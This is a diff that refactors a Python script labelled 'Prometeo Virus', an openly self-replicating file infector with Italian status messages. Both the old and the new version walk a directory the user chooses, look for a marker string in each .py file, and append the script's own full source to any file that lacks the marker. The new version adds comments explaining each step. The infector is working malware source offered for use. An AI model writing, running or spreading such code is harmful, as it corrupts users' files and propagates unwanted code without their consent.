@@ -1,85 +1,73 @@
-#!usr/bin/pyhton
-import os, sys, shutil, random, glob, time
+#!/usr/bin/env python3
+
+from os import path, chdir, getcwd, walk
+from time import sleep
 
 viruskey = "#! My Virus Key: 1x2y3z"
-infettato = "No"
 banner = """
-+-----------------+----------------+
++----------------+-----------------+
 | Prometeo Virus | Coded by Godlik |
 +----------------+-----------------+
-| Versione: 1.4  | Data: 11/1/2017 |
+| Versione: 1.4  | Data: 19/1/2017 |
 +----------------+-----------------+
 	  """
-myself = sys.argv[0]
 
-#1 indentificazione
 
-def identificazione(mypath):
-
-	_path_ = os.getcwd()
-	for path, directory, files in os.walk(_path_):
-		for file in files:
-			if not file == myself:
-				time.sleep(0.5)
-				_file_, punto, estensione = file.partition('.')
-				if estensione == "py":
-					try:
-						infettato = "No"
-						fileopen = open(file, 'r')
-						for line in fileopen:
+def identificazione(mypath, script_name):
+	# Get Current working directory
+	cwd = getcwd()
+	# walk work like a recursive function to fetch every
+	# file inside a given directory
+	for path, directory, files in walk(cwd):
+		# For every file fetched inside that directory
+		for _file in files:
+			# We check if the target file isn't equal
+			# to our script
+			if _file != script_name:
+				sleep(0.5)
+				# If file ends with ".py"
+				if _file.endswith(".py"):
+					# Check this flag
+					infettato = False
+					# Open the file we want to infect
+					with open(_file, 'r') as f_to_infect:
+						for line in f_to_infect:
+							# If the file was already infected
 							if viruskey in line:
-								infettato = "Si"
-								print("[*] File gia' infettato > " + file)
+								# We set the flag
+								infettato = True
+								print("[*] %s gia' infetto" % _file)
 								break
-						if infettato == "No":
-							print("[+] Infetto il file... " + file)
-							infezione_exploit(file, mypath)
-					except FileNotFoundError:
-						pass
+						# If it wasn't infected
+						if not infettato:
+							print("[+] Infetto il file '%s'" % _file)
+							# Call the function to infect it
+							infezione_myself(_file, mypath)
 
-#2 Infezione
 
-#exploit = """"""
-def infezione_exploit(file, mypath):
-
-	exploitstatus = "No"
-	exploit =  "#"
-	print("\n[*] Preparo l'Exploit...")
-	try:
-		_file_ = open(file, 'a')
-		_file_.write("\n" + exploit)
-		exploitstatus = "Si"
-		_file_.close()
-	except FileNotFoundError:
-		pass
-	if exploitstatus == "Si":
-		print("[+] Infezione Riuscita")
-		print("[*] Mi copio nel file...")
-		infezione_myself(file, mypath)
-
-#3 Infezione (Inietto tutto il virus)
-
-def infezione_myself(file, mypath):
-
-	_myself_ = open(mypath, 'r')
-	file = open(file, 'a')
-	for line in _myself_:
-		file.write(str(line))
-	print("[+] File infettato Correttamente!")
-	file.close()
-	_myself_.close()
+def infezione_myself(_file, mypath):
+	# I open my self and the file destination
+	with open(mypath, 'r') as f_source, open(_file, 'a') as f_dest:
+		for line in f_source:
+			# We get every single line of our script
+			# and put it into our destination file.
+			f_dest.write(str(line))
+		print("[+] File infettato Correttamente!")
 
 # If name in Main
 
 if __name__ == '__main__':
-
 	print(banner)
+	path_to_analyze = input("Path >> ")
+	# Get the full path of the scrypt
+	mypath = path.realpath(__file__)
+	# Get script name
+	script_name = path.basename(__file__)
+	print(mypath)
 	try:
-		directory = input("Path >> ")
-		mypath = os.getcwd() + "\\" + sys.argv[0]
-		print(mypath)
-		os.chdir(directory)
+		chdir(path_to_analyze)
 	except FileNotFoundError :
+		# Handle error if file not found
 		print("[!] Path non Trovata")
 		exit()
-	identificazione(mypath)
+	identificazione(mypath, script_name)
